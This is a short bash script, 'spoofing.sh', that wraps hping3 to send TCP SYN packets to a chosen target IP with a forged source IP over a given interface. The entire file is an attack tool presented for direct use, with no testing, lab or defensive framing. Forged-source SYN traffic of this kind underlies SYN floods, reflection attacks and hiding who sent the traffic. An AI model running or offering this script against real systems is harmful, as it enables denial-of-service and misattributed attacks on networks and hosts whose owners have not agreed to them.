#!/bin/bash

# spoofing.sh - IP Spoofing script

# Function to perform IP spoofing
perform_spoofing() {
    echo "Starting IP spoofing..."
    echo "Target IP: $1"
    echo "Spoofed IP: $2"
    echo "Interface: $3"
    sudo hping3 -a "$2" -S "$1" -I "$3"
}

# Check if target IP, spoofed IP, and interface are provided
if [ -z "$1" ] || [ -z "$2" ] || [ -z "$3" ]; then
    echo "Usage: $0 <target_ip> <spoofed_ip> <interface>"
    exit 1
fi

TARGET_IP=$1
SPOOFED_IP=$2
INTERFACE=$3

perform_spoofing "$TARGET_IP" "$SPOOFED_IP" "$INTERFACE"
